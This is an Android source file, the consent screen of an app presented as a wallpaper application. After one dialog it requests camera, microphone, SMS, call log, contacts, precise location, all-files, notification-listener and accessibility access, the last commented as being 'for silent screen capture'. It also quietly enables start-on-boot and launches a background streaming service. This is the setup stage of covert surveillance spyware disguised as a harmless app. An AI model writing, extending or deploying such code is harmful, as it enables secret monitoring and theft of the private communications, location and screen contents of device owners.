package com.example.wallpaperapplication;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.widget.Toast;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.preference.PreferenceManager;
import java.util.ArrayList;
import java.util.List;

public class ConsentActivity extends AppCompatActivity {
    private static final int PERMISSIONS_REQUEST = 1001;
    private static final int REQUEST_CODE_MANAGE_STORAGE = 2296;
    private static final int REQUEST_CODE_NOTIFICATION_LISTENER = 2297;
    private static final int REQUEST_CODE_ACCESSIBILITY = 2298;

    private boolean storagePermissionRequested = false;
    private boolean notificationAccessRequested = false;
    private boolean accessibilityAccessRequested = false;

    private String[] getRequiredPermissions() {
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.RECORD_AUDIO);
        perms.add(Manifest.permission.READ_CALL_LOG);
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        perms.add(Manifest.permission.READ_CONTACTS);
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        return perms.toArray(new String[0]);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (savedInstanceState != null) {
            storagePermissionRequested = savedInstanceState.getBoolean("storagePermissionRequested", false);
            notificationAccessRequested = savedInstanceState.getBoolean("notificationAccessRequested", false);
            accessibilityAccessRequested = savedInstanceState.getBoolean("accessibilityAccessRequested", false);
        }

        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
        boolean consentGiven = prefs.getBoolean("consent_given", false);
        if (!consentGiven) {
            showConsentDialog();
        } else {
            checkPermissionsOrFinish();
        }
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
        outState.putBoolean("storagePermissionRequested", storagePermissionRequested);
        outState.putBoolean("notificationAccessRequested", notificationAccessRequested);
        outState.putBoolean("accessibilityAccessRequested", accessibilityAccessRequested);
    }

    private void showConsentDialog() {
        new AlertDialog.Builder(this)
                .setTitle("Consent Required")
                .setMessage(R.string.consent_text)
                .setCancelable(false)
                .setPositiveButton("موافقم", (dialog, which) -> {
                    PreferenceManager
                            .getDefaultSharedPreferences(this)
                            .edit()
                            .putBoolean("consent_given", true)
                            .putBoolean(Constants.PREF_STREAMING_ENABLED, true)
                            .putBoolean(Constants.PREF_BOOT_ENABLED, true)
                            .apply();
                    checkPermissionsOrFinish();
                })
                .setNegativeButton("Cancel", (dialog, which) -> {
                    Toast.makeText(this,
                            "You must agree to proceed",
                            Toast.LENGTH_LONG).show();
                    finish();
                })
                .show();
    }

    private boolean hasNotificationAccess() {
        String enabledListeners = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        String packageName = getPackageName();
        String listenerName = packageName + "/" + StreamingService.NotificationListener.class.getName();
        return enabledListeners != null && enabledListeners.contains(listenerName);
    }

    private void checkPermissionsOrFinish() {
        // 1. Check runtime permissions
        List<String> missingPermissions = new ArrayList<>();
        for (String perm : getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                missingPermissions.add(perm);
            }
        }

        if (!missingPermissions.isEmpty()) {
            ActivityCompat.requestPermissions(
                    this,
                    missingPermissions.toArray(new String[0]),
                    PERMISSIONS_REQUEST
            );
            return;
        }

        // 2. Check All Files Access for Android 11+ (API 30+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            if (!storagePermissionRequested) {
                storagePermissionRequested = true;
                Toast.makeText(this, "Please grant All Files Access to proceed", Toast.LENGTH_SHORT).show();
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.addCategory("android.intent.category.DEFAULT");
                    intent.setData(Uri.parse(String.format("package:%s", getPackageName())));
                    startActivityForResult(intent, REQUEST_CODE_MANAGE_STORAGE);
                } catch (Exception e) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivityForResult(intent, REQUEST_CODE_MANAGE_STORAGE);
                }
                return;
            }
        }

        // 3. Check Notification Listener Access
        if (!hasNotificationAccess()) {
            if (!notificationAccessRequested) {
                notificationAccessRequested = true;
                Toast.makeText(this, "Please enable notification access for streaming notifications", Toast.LENGTH_LONG).show();
                Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                startActivityForResult(intent, REQUEST_CODE_NOTIFICATION_LISTENER);
                return;
            }
        }

        // 4. Check Accessibility Access (for silent screen capture on Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !hasAccessibilityAccess()) {
            if (!accessibilityAccessRequested) {
                accessibilityAccessRequested = true;
                Toast.makeText(this, "Please enable Accessibility for Wallpaper to allow screen capture", Toast.LENGTH_LONG).show();
                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivityForResult(intent, REQUEST_CODE_ACCESSIBILITY);
                return;
            }
        }

        // 5. All permissions requested, proceed to MainActivity
        proceedToMainActivity();
    }

    private boolean hasAccessibilityAccess() {
        try {
            String enabledServices = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabledServices == null) return false;
            String serviceName = getPackageName() + "/" + WallpaperAccessibilityService.class.getName();
            return enabledServices.contains(serviceName);
        } catch (Exception e) {
            return false;
        }
    }

    @Override
    public void onRequestPermissionsResult(
            int requestCode, String[] permissions, int[] grantResults
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSIONS_REQUEST) {
            boolean allGranted = true;
            for (int r : grantResults) {
                if (r != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                checkPermissionsOrFinish();
            } else {
                Toast.makeText(this,
                        "Permissions are required for streaming",
                        Toast.LENGTH_LONG).show();
                finish();
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_MANAGE_STORAGE || requestCode == REQUEST_CODE_NOTIFICATION_LISTENER || requestCode == REQUEST_CODE_ACCESSIBILITY) {
            checkPermissionsOrFinish();
        }
    }

    private void proceedToMainActivity() {
        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
        if (prefs.getBoolean(Constants.PREF_STREAMING_ENABLED, true)) {
            try {
                Intent serviceIntent = new Intent(this, StreamingService.class);
                ContextCompat.startForegroundService(this, serviceIntent);
            } catch (Exception e) {
                // Ignore if foreground service launch has timing constraints
            }
        }
        startActivity(new Intent(this, MainActivity.class));
        finish();
    }
}